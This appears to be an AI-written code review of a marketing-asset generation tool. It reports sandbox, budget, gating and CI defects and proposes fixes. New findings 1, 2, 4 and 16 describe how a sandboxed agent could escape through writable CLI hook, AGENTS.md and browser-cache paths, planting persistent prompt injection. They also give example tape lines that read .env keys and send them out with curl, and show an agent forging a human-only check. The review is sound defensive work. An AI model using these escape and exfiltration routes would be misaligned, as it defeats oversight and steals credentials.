→ review on omp with @review (anthropic/claude-opus-5-5:high)
Of the 48 round-1 findings, 32 are fixed, 14 are only partly fixed, 1 regressed (17) and 1 is still open (41). The round-2 diff adds 3 blockers: the agent sandbox can be escaped, a VHS tape still runs commands with no sandbox, and the agent shell cannot write to `/dev/null`. That last one also means the sandbox test passes whether or not the sandbox works.

Two paths you named don't exist. The Playwright allowlist is in `src/render/stills.ts`, and the budget code is in `src/budget/ledger.ts` and `src/commands/budget.ts`.

**What I ran:**
- `node --test` on the review, budget, updater, campaign-zip, export and security test files: 43 passed, 0 failed.
- `sandbox-exec` with the same profile shape as `src/agent-env.ts`.
- Throwaway scripts against `runGates` and `governedFields`, since deleted.
- Market Blaster's `src/check.ts` and `src/destinations/meta.ts` in `../market-blaster`, read to compare checks.

## Round-1 status

| # | Status | Evidence |
|---|---|---|
| 1 | Fixed, but text in iframes is still missed (new 6) | `src/render/stills.ts:29-55`: allows only the input file, the asset dir, templates and `assets/*/out/**`; `page.route` also covers frames. Test at `test/security.test.ts` (HTML render). |
| 2 | Partial | There is now a sandbox (`src/agent-env.ts:26-49`). It can be escaped (new 1), blocks `/dev/null` (new 3) and hides reads only through a denylist (new 4). On Linux without `bwrap` it runs with no sandbox (`:46`). |
| 3 | Partial | Minimal env at `src/render/ffmpeg.ts:24`, but the tape still runs any command with no sandbox (new 2). |
| 4 | Fixed | `stills.ts:91-93` sets `htmlLabels:false`; `test/render.test.ts:55-60` asserts `<text>` and the label. |
| 5 | Fixed | `src/review/reviewer.ts:25` keeps the real `HOME` (`agent-env.ts:10`); asserted in `security.test.ts`. |
| 6 | Partial | Token-set comparison, `$`, `×` and `percent` work; graphics text, alt text and captions are included (`src/review/gates.ts:7-17,116-130`). Some common forms still get through (new 5). |
| 7 | Partial | Voiceover renders first (`src/commands/render.ts:25`), is mixed with `amix` (`ffmpeg.ts:50-55`) and added to `embeds` (`render.ts:58`). The `script.txt` path never triggers the voice disclosure gate (new 9). |
| 8 | Fixed, but the baseline can stall | Snapshots are committed; the check reads them from git (`src/updater/check.ts:76-80`); the PR job allows snapshot paths (`platform-watch.yml:142`). See new 12. |
| 9 | Fixed | `platform-watch.yml:83`. |
| 10 | Fixed | `platform-watch.yml:87-89` (patch from validated files), `:67` (`persist-credentials: false`), `:144` (packs re-validated). |
| 11 | Fixed | `src/updater/propose.ts:56` (verification fields frozen), `:66` (quote ≥ 20 chars, found in the snapshot, contains the new value). |
| 12 | Partial | The key is computed in its own step (`yml:30-32`); one fixed branch with `gh pr edit` (`:145-153`); evidence goes in the PR body. Without the App secrets it falls back to `GITHUB_TOKEN` with only a notice (`:107-116`), so the pack PR still never triggers CI. |
| 13 | Fixed | `check.ts:62` uses `redirect:'manual'`; same-host redirect test at `test/updater.test.ts:30-33`. Line 64 is now dead code. |
| 14 | Fixed | `verify` writes `verified` and `lastVerified` (`propose.ts:84-85`); policy and spec freshness checks at `gates.ts:23-24,54`; the fixed warning is gone. |
| 15 | Partial | `review.ts:68` keeps `accepted`; `revise.ts:21-35` edits only failing posts. But `revise.ts:51` re-renders every asset (new 10). |
| 16 | Fixed | `src/review-hash.ts:13-20`, checked at `accept.ts:22` and `export.ts:57`. |
| 17 | **Regressed** | Anchors (`gates.ts:72-73`) and titles (`:71`) are checked. But commit e4a24e4 (`gates.ts:79-82`) turned a gif on Bluesky, Mastodon or LinkedIn into a warning, and Market Blaster rejects it (MB `check.ts:32-35`). See new 7. |
| 18 | Fixed | `gates.ts:56-69` (X weighting, Bluesky graphemes, 23-char links, each thread item). |
| 19 | Fixed | `gates.ts:76-77`. |
| 20 | Fixed | `gates.ts:98-110` reads thresholds from the pack, uses 3:1 for large text, and treats no-text as `null`; alt text is required for gif and document too (`:91`). |
| 21 | Partial | `accepts` lists (`gates.ts:44,49`); LinkedIn moved to `sponsorship` (`platforms/linkedin/pack.yml:28-35`). DEV accepts "Hand Written (No AI)" for generated text (new 8). |
| 22 | Fixed | Files loaded during the render (`stills.ts:49`) now feed `embeds` (`render.ts:49`). |
| 23 | Fixed | `gates.ts:33-38`. |
| 24 | Fixed | `reviewer.ts:35-62`: `hookComparison`, N/A only when both runs say N/A, retries per order. |
| 25 | Fixed | `calibration.json` has 20 fixtures, 8 with hooks. |
| 26 | Fixed (reported, not tolerated) | `src/budget/ledger.ts:14-17` raises a `UserError`; test at `test/budget.test.ts:82`. |
| 27 | Fixed | `ledger.ts:46-61` (recovery mutex plus rename); test at `budget.test.ts:88`. Small leftover in new 21. |
| 28 | Partial | The mechanism exists (`agent-env.ts:52-77`, `config.ts:97-101`). The CI config (`yml:83`) still uses subscription billing, so CI runs are logged with `usd: null`. The reviewer cannot use JSON output (new 14). |
| 29 | Fixed, too broadly | `src/providers/images.ts:63-64` also settles at $0 on timeouts and on 200 responses with a bad body (new 15). |
| 30 | Fixed | `render.ts:98`. |
| 31 | Fixed | `render.ts:104-106` builds the PDF from the rendered PNGs. The PDF has no text layer. |
| 32 | Fixed | `src/render/video.ts:76` rejects caption burn-in for VHS. |
| 33 | Fixed | `ffmpeg.ts:22-23` (`BSTUDIO_RENDER_TIMEOUT_MS`), `:58` (`-c:v copy`). |
| 34 | Partial | Per-node metrics are kept (`render.ts:49`, `src/render/metrics.ts:51`). The safe zone is still a fixed 5% (`metrics.ts:8`), now only a warning (`gates.ts:112`), and platform UI overlays are still ignored. |
| 35 | Fixed | `src/campaign-zip.ts:67` and the schema allow `null`. |
| 36 | Fixed for the zip | `campaign-zip.ts:51` points to `../../media`. `--dir` export still copies media twice (`export.ts:39,74`). |
| 37 | Fixed | `src/commands/auth.ts:50` limits keys to GEMINI and OPENAI. |
| 38 | Partial | Added: torn-line and stale-lock tests, same-host redirect test, v2 zip import test (`test/export.test.ts:59`), RIFF check (`voice.ts:36`), all six gate ids required (`export.ts:53-54`). The new sandbox test proves nothing (new 3). |
| 39 | Fixed | `review.ts:63`, `accept.ts:21`. |
| 40 | Fixed | `reviewer.ts:42`. |
| 41 | **Open** | `reviewer.ts:17-19` is unchanged; only a docs note was added (b7d1bd3). |
| 42 | Fixed | Environment is now an allowlist plus `protectedEnv` (`agent-env.ts:6-19`). |
| 43 | Fixed | `render.ts:92` reads the size from the PNG IHDR. |
| 44 | Fixed, fragile | `stills.ts:96` needs a sibling `../slipway` checkout (new 20). |
| 45 | Fixed | `src/library.ts:33-37`. |
| 46 | Fixed | `campaign-zip.ts:28`. |
| 47 | Partial | The made-up OpenAI id was replaced by `gpt-image-2` with doc links (`providers/prices.yml:3-4,17`). `gemini-nano-banana-2.1` is still unconfirmed; not checkable offline. |
| 48 | Partial | `import` is wrapped (`src/commands/export.ts:20-21`). The `check` call at `:23` still surfaces a raw `Error`, which `src/cli.ts:93` rethrows as a stack trace. |

## New findings

1. **blocker** `src/agent-env.ts:31`: the sandbox lets the agent write to `~/.omp`, `~/.claude`, `~/.codex` and `~/Library/Caches`, and every one of those is a way out.
   - **Problem:**
     - `~/.claude/settings.json` hooks and `~/.codex/config.toml` `notify` run later, outside the sandbox.
     - `~/.omp/agent/AGENTS.md` and skills give a prompt injection that persists across every future session.
     - `~/Library/Caches/ms-playwright/chromium-1255/` holds the browser that `bstudio render` later launches with no sandbox and the full `process.env`.
     - All these paths exist on this machine.
     - The docs (`docs/configuration.md:43`) claim writes outside the workspace and temp dir are denied, which is false.
   - **Fix:** point CLI state at per-run directories (`CLAUDE_CONFIG_DIR`, `CODEX_HOME`, or the omp equivalent), seeded with the auth file only, or allow only exact session/state subpaths. Never allow `~/Library/Caches` as a whole. Deny writes to settings, hooks, `AGENTS.md` and skills.

2. **blocker** `src/render/ffmpeg.ts:15-24` and `src/render/video.ts:86`: `vhs` runs a tape the agent wrote, with no sandbox and full filesystem and network access.
   - **Problem:** `Type "cat /Users/<u>/BlastStudio/.env"` puts the keys into the exported GIF. `Type "curl -d @… https://…"` sends them out during the render. The agent knows the real `HOME` from its own environment. The `env`/`printenv` regex is beside the point, and `set` or `export -p` get past it anyway.
   - **Fix:** run `vhs`, `hyperframes`, `d2` and `python3 diagram.py` (`stills.ts:93-100`, which also inherit the full env) through `sandboxCommand`, with the studio root hidden and network denied where possible. Then delete the regex.

3. **blocker** `agent-env.ts:33` and `test/security.test.ts:56-58`: `(deny file-write*)` also blocks writes to `/dev/null`.
   - **Problem:**
     - I checked it: `sandbox-exec -p '(version 1)(allow default)(deny file-write*)' sh -c 'echo hi >/dev/null'` prints `/dev/null: Operation not permitted`. Any agent shell command with `2>/dev/null` fails.
     - The sandbox test runs `cat "$1" >/dev/null` and `touch "$2" 2>/dev/null`. Both exit 1 because of the redirect, whether or not the read or write was actually denied. I confirmed `cat` exits 1 under a profile that has no read deny at all.
   - **Fix:** add `(allow file-write* (literal "/dev/null") (literal "/dev/tty") (regex #"^/dev/fd/"))`. Rewrite the test to look at stderr ("Operation not permitted" on the target path), not at exit codes after a redirect.

4. **concern** `agent-env.ts:29`: the read denylist leaves other credentials readable, and network access is allowed.
   - **Problem:**
     - `~/.npmrc`, `~/.docker/config.json` and `~/.config/gcloud/application_default_credentials.json` all exist on this machine and are not hidden.
     - On Linux, `bwrap` is started without `--unshare-pid`, so `/proc/<ppid>/environ` (the shell's exported secrets) may be readable. [INFERENCE: not tested]
     - If `bwrap` exists but cannot create user namespaces (Ubuntu 24.04 AppArmor), the agent run fails with no fallback. [INFERENCE: not tested]
   - **Fix:** deny `$HOME` by default and re-allow the CLI auth dirs; add `--unshare-pid --die-with-parent`; probe `bwrap` once and warn on failure.

5. **concern** `gates.ts:7`: the grounding gate still misses common marketing forms. I ran these through `runGates` with a brief containing only "40%".
   - **Problem:** "10,000+ users", "2 million users", "3 times faster", "100+ customers" and "by half" each produce at most a warning. "Builds are \`10x\` faster" produces nothing, because line 123 strips inline code before scanning.
   - **Fix:** accept `+` between number and unit; add `million`, `billion` and `thousand` multipliers and `times`, `half`, `double`; don't strip inline code from post text.

6. **concern** `src/render/metrics.ts:21`: `measureText` walks only the top document.
   - **Problem:** text inside an iframe pointing at the asset's own HTML (allowed by `stills.ts:39-41`), CSS `::before`/`::after` `content`, `<canvas>` and SVG loaded through `<img>` all skip the grounding, size and contrast gates.
   - **Fix:** abort `document`/subframe requests other than the input file, or walk `page.frames()`; read pseudo-element `content` with `getComputedStyle(el, '::before')`.

7. **concern** `gates.ts:79-82`: Studio still passes posts that Market Blaster rejects. I confirmed each case below with `runGates`.
   - **Problem:**
     - gif on Bluesky, Mastodon or LinkedIn: only a warning; MB `check.ts:32-35` errors.
     - image on Hashnode or GitHub Discussions: passes; MB `check.ts:28-31` errors ("API publishing cannot attach media").
     - a 3 MB image on Bluesky: passes; MB's limit is 2 MB (`check.ts:64`).
     - image and video together on Bluesky: passes; MB `check.ts:42` errors.
     - video on LinkedIn: passes, but the zip marks it `api` (`campaign-zip.ts:60`) and MB `check.ts:54` errors.
   - **Fix:** put the per-destination rules from MB `check.ts` into the packs (`maxBytes`, allowed kinds, exclusive kinds), or run `mblast check` against the zip before export succeeds.

8. **concern** `platforms/devto/pack.yml:18` and `gates.ts:44`: "Hand Written (No AI)" is an accepted tier for a body that Studio generated, so the false disclosure passes. **Fix:** split `accepts` per AI state, or drop the hand-written tier when `pack.ai` is `draft`.

9. **concern** `render.ts:59-62`: text-to-speech generated from `script.txt` sets `aiGenerated` on the video but records no voiceover asset, provider, license or cost.
   - **Problem:** `gates.ts:40` (`kind === 'voiceover'`) never asks for the voice disclosure, and the rights gate never sees the `openai` provider.
   - **Fix:** remove the `script.txt` path and require a `voiceover:` asset, or record `voiceGenerated`, provider and license on the video and include it in the voice check.

10. **concern** `src/commands/revise.ts:51`: `render(args)` re-renders every asset, including those of passing and accepted posts.
    - **Problem:** VHS output differs on every run, so the media hash changes, the keep-`accepted` check at `review.ts:68` fails, and the human verdict is lost. Every round also re-runs the paid reviewer on posts that already pass.
    - **Fix:** render only the editable assets and review only the failing posts.

11. **concern** `review.ts:64`: `mediaContentHash` throws when post media is missing, which happens with a skipped illustration.
    - **Problem:** it runs after the billed reviewer call (`:58`), so money is spent and the whole command aborts instead of failing the specs gate.
    - **Fix:** hash before calling the reviewer, and turn a missing file into a gate failure.

12. **concern** `src/updater/propose.ts:33` with `platform-watch.yml`: the snapshot baseline only moves forward through a PR, and only after `propose` succeeds.
    - **Problem:**
      - 39 of the 71 automated sources govern no pack field (checked with `governedFields`).
      - When only those change, `propose` throws "Changed sources govern no sourced pack fields", so the `pr` job is skipped and the snapshot never lands. Next week the same change is reported again and the agent runs again.
      - The same happens when `MODEL_API_KEY` is unset.
      - Seven page-hash sources have no snapshot at all (hashnode-33, instagram-44/45/46/48, tiktok-49, gemini-pricing), so the run exits 1 every week.
    - **Fix:** publish snapshots in a PR independent of `propose`; make "no governed fields" a no-op; mark sources that can't be fetched as `manual`.

13. **concern** `agent-env.ts:68-75` and `ledger.ts:83-89`: settlement takes the CLI's reported cost with no cap, and `settle` never compares it to the reservation. The monthly cap can be exceeded with no warning. **Fix:** pass a hard budget flag to the CLI where one exists, and warn or block further calls when a settlement exceeds its reservation.

14. **concern** `reviewer.ts:42-43` and `propose.ts:45`: API billing only reads a cost when the CLI prints JSON, but then the reviewer gets the `{result, total_cost_usd}` wrapper.
    - **Problem:**
      - The wrapper fails the schema, so the reviewer reports "invalid JSON twice".
      - The evidence fence inside an escaped `result` string doesn't parse.
      - In practice, API-billed reviewers always settle at `maxUsdPerRun`.
      - `protectedEnv` blocks `OPENAI_API_KEY` and `GEMINI_API_KEY`, so codex or gemini CLIs can't use API-key billing at all.
    - **Fix:** unwrap `result` when the output is a JSON wrapper. Let a key appear in `passEnv` when the matching role sets `billing: api`.

15. **concern** `images.ts:63,83` and `voice.ts:37`: any failure settles at $0, including a timeout after the request was sent and a 200 response whose body couldn't be parsed. The provider may still have charged. **Fix:** settle at $0 only for 4xx responses and failures before the request was sent; keep the reservation otherwise.

16. **concern** `make.ts:33` and `gates.ts:96`: the agent writes `asset.yml`, so it can set `trademarkChecked: true` and pass the human-only rights check. **Fix:** remove `trademarkChecked` (and `license` for template assets) during copy-back, and record the human confirmation through a CLI command.

17. **nit** `export.ts:54`: export trusts the stored gate results; it doesn't re-run `runGates` the way `accept.ts:28` does. A pack updated after review is not enforced.

18. **nit** `check.ts:64`: the host check is dead now that redirects are manual. `src/commands/sources.ts:11` accepts `--write` and ignores it; `check` always writes.

19. **nit** `render.ts:68,72`: `raw.skipped` is never cleared after a later render succeeds, so `asset.yml` keeps saying the asset was skipped.

20. **nit** `stills.ts:96`: the arch-diagram path `../../../slipway/...` doesn't exist in an installed package.

21. **nit** `ledger.ts:48-61`: if a process crashes while holding `ledger.lock.recovery`, or a dead PID gets reused, stale-lock recovery is blocked forever and every paid call times out after 10 s.

22. **nit** `gates.ts:116`: the measured video length grounds any "N seconds" claim, such as "deploys in 30 seconds" next to a 30 s demo.

23. **nit** `gates.ts:121`: WebVTT cue numbers produce one "Ungrounded version or identifier" warning per cue.

24. **nit** `platform-watch.yml:86,92`: `$(date -u +%F)` is computed again in the propose job, so a run crossing UTC midnight looks for the wrong report. There is also no `concurrency:` group.

25. **nit** `campaign-zip.ts:71`: the zip is built in memory and never checked against MB's limits (1 GiB total, 500 MiB per entry, MB `campaign-zip.ts:7`) before writing.

26. **nit** `src/commands/render-preview.ts:19`: `assetDir: dirname(input)` lets the page load anything in the directory of whatever path the user passes.
